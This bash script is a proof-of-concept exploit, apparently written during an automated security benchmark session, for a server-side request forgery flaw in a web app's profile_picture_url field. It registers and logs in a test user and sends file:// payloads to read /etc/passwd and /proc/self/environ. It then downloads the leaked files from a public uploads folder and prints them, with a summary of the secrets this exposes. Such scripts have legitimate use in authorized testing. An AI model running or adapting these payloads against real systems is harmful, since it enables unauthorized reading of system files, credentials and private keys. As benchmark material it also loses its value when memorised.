#!/bin/bash
# POC: Comprehensive SSRF POC demonstrating the attack chain: authentication, SSRF exploitation via file://, and unauthenticated file access
# Target: ./repo
# Created: 2025-11-04T17:26:47.689Z
# Session: benchmark-XBEN-024-24-mhktkgzl

# SSRF Vulnerability POC via profile_picture_url Parameter - Version 3
# Demonstrates the vulnerability chain with comprehensive testing

TARGET_URL="${TARGET_URL:-http://localhost:5000}"

echo "=============================================="
echo "SSRF via profile_picture_url Parameter POC"
echo "=============================================="
echo "[*] Target: $TARGET_URL"
echo ""

# Test account credentials
TEST_EMAIL="ssrf_test_$(date +%s)@example.com"
TEST_PASSWORD="SecurePass123!"
PROFILE_ENDPOINT="/profile"
UPLOAD_DIR="/static/uploads"

echo "[PHASE 1] User Authentication Setup"
echo "======================================"

# Register a new user
echo "[*] Attempting user registration..."
REG_RESP=$(curl -s -X POST "${TARGET_URL}/register" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=${TEST_EMAIL}&password=${TEST_PASSWORD}&confirm_password=${TEST_PASSWORD}" 2>&1)

if echo "$REG_RESP" | grep -qi "registered\|success\|welcome"; then
    echo "[+] User registration successful"
elif echo "$REG_RESP" | grep -qi "already"; then
    echo "[*] User already exists (may be from previous run)"
else
    echo "[*] Registration response: ${REG_RESP:0:100}"
fi

# Authenticate and get session
echo "[*] Authenticating user..."
COOKIE_JAR=$(mktemp)
LOGIN_RESP=$(curl -s -c "$COOKIE_JAR" -X POST "${TARGET_URL}/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=${TEST_EMAIL}&password=${TEST_PASSWORD}" 2>&1)

if [ -s "$COOKIE_JAR" ] && grep -q "session\|auth" "$COOKIE_JAR"; then
    echo "[+] Authentication successful - Session obtained"
    echo "[*] Cookies:"
    cat "$COOKIE_JAR" | head -3
else
    echo "[-] Authentication may have failed, attempting anyways..."
fi

echo ""
echo "[PHASE 2] SSRF Exploitation - file:// Scheme"
echo "=============================================="

# Payload 1: Read /etc/passwd via file:// URL
echo "[*] Exploit 1: Reading /etc/passwd via file:// URL"
echo "[*] Sending: profile_picture_url=file:///etc/passwd"

EXPLOIT_RESPONSE=$(curl -s -b "$COOKIE_JAR" -X POST "${TARGET_URL}${PROFILE_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "profile_picture_url=file:///etc/passwd" 2>&1)

echo "[*] Server response (first 200 chars): ${EXPLOIT_RESPONSE:0:200}"

# Try to access the downloaded file
echo "[*] Attempting to access downloaded file at ${UPLOAD_DIR}/passwd"
FILE_HTTP_CODE=$(curl -s -w "%{http_code}" -o /tmp/passwd_test.txt "${TARGET_URL}${UPLOAD_DIR}/passwd" 2>&1)

if [ "$FILE_HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: File accessible via HTTP (Status: 200)"
    if grep -q "root:" /tmp/passwd_test.txt 2>/dev/null; then
        echo "[+] VULNERABILITY CONFIRMED: /etc/passwd content retrieved"
        echo "[+] File preview:"
        head -3 /tmp/passwd_test.txt
    fi
else
    echo "[*] HTTP Status: $FILE_HTTP_CODE"
fi

echo ""

# Payload 2: Read /proc/self/environ via file:// URL
echo "[*] Exploit 2: Reading /proc/self/environ via file:// URL"
echo "[*] Sending: profile_picture_url=file:///proc/self/environ"

EXPLOIT_RESPONSE=$(curl -s -b "$COOKIE_JAR" -X POST "${TARGET_URL}${PROFILE_ENDPOINT}" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "profile_picture_url=file:///proc/self/environ" 2>&1)

echo "[*] Server response (first 200 chars): ${EXPLOIT_RESPONSE:0:200}"

# Try to access the downloaded file
echo "[*] Attempting to access downloaded file at ${UPLOAD_DIR}/environ"
FILE_HTTP_CODE=$(curl -s -w "%{http_code}" -o /tmp/environ_test.txt "${TARGET_URL}${UPLOAD_DIR}/environ" 2>&1)

if [ "$FILE_HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: File accessible via HTTP (Status: 200)"
    ENVIRON_PREVIEW=$(cat /tmp/environ_test.txt | tr '\0' '\n' | head -3)
    if [ ! -z "$ENVIRON_PREVIEW" ]; then
        echo "[+] VULNERABILITY CONFIRMED: Environment variables leaked"
        echo "[+] Variables preview:"
        echo "$ENVIRON_PREVIEW"
    fi
else
    echo "[*] HTTP Status: $FILE_HTTP_CODE"
fi

echo ""
echo "[PHASE 3] Vulnerability Analysis"
echo "=================================="
echo "[*] SSRF Vulnerability Chain:"
echo "    1. Accepts arbitrary file:// URLs in profile_picture_url"
echo "    2. Uses urllib.request.urlretrieve() without validation"
echo "    3. Stores downloaded files in web-accessible directory"
echo "    4. Files accessible to unauthenticated users"
echo "    5. Enables arbitrary file read on filesystem"
echo ""
echo "[*] Impact: CRITICAL - Arbitrary File Disclosure"
echo "    - Can read /etc/passwd for user enumeration"
echo "    - Can read /proc/self/environ for secrets exposure"
echo "    - Can read application source code"
echo "    - Can read private keys"
echo "    - Can read any file readable by web server process"
echo ""

# Cleanup
rm -f "$COOKIE_JAR" /tmp/passwd_test.txt /tmp/environ_test.txt

echo "[*] POC Execution Complete"